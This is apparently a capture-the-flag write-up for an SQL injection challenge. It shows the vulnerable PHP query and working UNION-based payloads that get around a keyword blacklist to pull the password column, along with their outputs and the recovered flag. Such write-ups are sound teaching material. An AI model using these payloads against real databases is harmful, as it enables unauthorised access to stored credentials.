---
layout: default
title: level07
---

Another SQLi challenge :D

We can see it filters some strings, and also we can see this interesting code:
```php
//$query = 'SELECT id,login,password FROM users WHERE id=' . $injection;
$query = 'SELECT id,login FROM users WHERE id=' . $injection;
```

So, it means we need to somehow achieve the `password`, however, we can't use the string `or`, which is found inside password.

Let's try giving this query:
`1337 union select id,login from (select 1337 as id, 1337, 1337 as login union select * from users)`

we trick the second select, and then he thinks the the column `password` is the column `login`, and by this way manage to get `(id,password)`.

* output
> ```
> Username for given ID: not_your_flag
>
> Other User Details:
> id -> 0
> login -> not_your_flag
> ```

Okay, so now our username is the flag. however, when we do `select * from table`, we select the first row, which doesn't include our flag.

Let's try selecting the next column, by adding: `where id between 1 and 1`

* input
> `1337 union select id,login from (select 1337 as id, 1337, 1337 as login union select * from users) where id between 1 and 1`
* output
> ```
> Username for given ID: WEBSEC{Because_blacklist_based_filter_are_always_great}
> 
> Other User Details:
> id -> 1
> login -> WEBSEC{Because_blacklist_based_filter_are_always_great}
> ```

(We could've also do: `select max(id)`, instead of using the `between`).

**Flag:** ***`WEBSEC{Because_blacklist_based_filter_are_always_great}`*** 